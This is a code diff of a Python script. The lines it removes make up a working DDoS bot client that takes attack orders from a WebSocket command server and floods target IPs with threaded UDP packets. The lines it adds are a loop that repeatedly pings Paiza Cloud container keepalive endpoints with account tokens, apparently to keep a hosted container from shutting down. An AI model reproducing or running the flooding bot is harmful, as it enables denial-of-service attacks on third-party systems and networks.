@@ -1,65 +1,105 @@
 import asyncio
-import socket
-import threading
+from simple_websocket import Client, ConnectionClosed
+import requests
+import json
 import time
-import websockets
-from keep_alive import keep_alive
+import threading
+import argparse
 
 
-async def connect_and_listen():
+# Function to get the container info
+def _container(account_token, container_id, container_token):
+    r = requests.get(
+        f'https://paiza.cloud/api/containers/{container_id}?container_token={container_token}',
+        headers={"Authorization": f"Bearer {account_token}"})
+    print(f"[-] Container info request {r.status_code}")
+
+
+# Function to keep the container alive
+def _container_keep_alive(account_token, container_id, container_token, ssid):
+    r = requests.get(
+        f'https://paiza.cloud/api/containers/{container_id}/keepalive?container_token={container_token}&updatedBy={ssid}',
+        headers={"Authorization": f"Bearer {account_token}"})
+    print(f"[-] Container keep alive {r.status_code}")
+
+
+# Function for active keep alive
+def _active_keep_alive(account_token, container_id, container_token):
     while True:
-        try:
-            uri = open('ip.txt', 'r').read().strip() if open(
-                'ip.txt', 'r').read().strip() else None
-            async with websockets.connect(uri) as websocket:
-                await listen(websocket)
-        except Exception as e:
-            print("Connection failed. Retrying in 10 seconds...")
-            await asyncio.sleep(5)
+        r = requests.get(
+            f'https://paiza.cloud/api/containers/{container_id}/activeKeepalive?container_token={container_token}',
+            headers={"Authorization": f"Bearer {account_token}"})
+        print(f"[-] Active keep alive {r.status_code}")
+        time.sleep(300)  # Active keep-alive interval
 
 
-async def listen(websocket):
+# Main function to handle WebSocket and keep the container alive
+def main(account_token, container_id, container_token):
     while True:
-        message = await websocket.recv()
+        # Grab the post_ssid
+        ws = Client.connect(
+            f'wss://paiza.cloud/socket.io-client/?token={account_token}&EIO=3&transport=websocket'
+        )
+        while True:
+            data = ws.receive()
+            if 'sid' in data:
+                ssid = json.loads(data[1:]).get('sid')
+                print(f"[-] SSID {ssid}")
+                break
 
-        if message == "heartbeat":
-            await websocket.send("doob")
+        # Get container info
+        _container(account_token, container_id, container_token)
+        time.sleep(15)
 
-        elif "attack" in message:
-            cmmd, type, ip, port, duration, threads = message.split("/")
-            print(f'Attacking {ip} with {type} for {duration} seconds')
-            data = type, ip, int(port), int(duration), int(threads)
-            await __ddos(data, websocket)
+        # Keep container alive
+        _container_keep_alive(account_token, container_id, container_token,
+                              ssid)
+        time.sleep(5)
 
-        else:
-            await websocket.send("unknown")
-
-
-def udp_flood(ip, port, duration):
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = b"A" * 1024
-    timeout = time.time() + duration
-    while time.time() < timeout:
-        client.sendto(payload, (ip, port))
-
-
-async def __ddos(data, websocket):
-    type, ip, port, duration, threads = data
-    if type == "udp":
-        thread_list = []
-        for _ in range(threads):
-            thread = threading.Thread(target=udp_flood,
-                                      args=(ip, port, duration))
-            thread.start()
-            thread_list.append(thread)
-
-        await websocket.send("attack_started")
-
-        for thread in thread_list:
-            thread.join()
-
-        await websocket.send("attack_stopped")
+        # Ping the ssid and close the connection
+        ws.send('2')
+        time.sleep(1)
+        ws.close()
+        print('[-] Connection closed repeating..')
+        print('')
+        time.sleep(40)
 
 
-keep_alive()
-asyncio.run(connect_and_listen())
+# Function to start both the main and active keep alive functions in separate threads
+def start_threads(account_token, container_id, container_token):
+    # Create threads for main and _active_keep_alive
+    main_thread = threading.Thread(target=main,
+                                   args=(account_token, container_id,
+                                         container_token))
+    active_keep_alive_thread = threading.Thread(target=_active_keep_alive,
+                                                args=(account_token,
+                                                      container_id,
+                                                      container_token))
+
+    # Start both threads
+    main_thread.start()
+    active_keep_alive_thread.start()
+
+    # Optionally, join the threads to ensure they continue running
+    main_thread.join()
+    active_keep_alive_thread.join()
+
+
+if __name__ == "__main__":
+    # Set up argument parsing
+    parser = argparse.ArgumentParser(
+        description="Paiza Cloud Container Manager")
+    parser.add_argument('--id', type=str, required=True, help='Container ID')
+    parser.add_argument('--token',
+                        type=str,
+                        required=True,
+                        help='Container Token')
+    parser.add_argument('--atoken',
+                        type=str,
+                        required=True,
+                        help='Account Token')
+
+    args = parser.parse_args()
+
+    # Start the threads with the parsed arguments
+    start_threads(args.atoken, args.id, args.token)
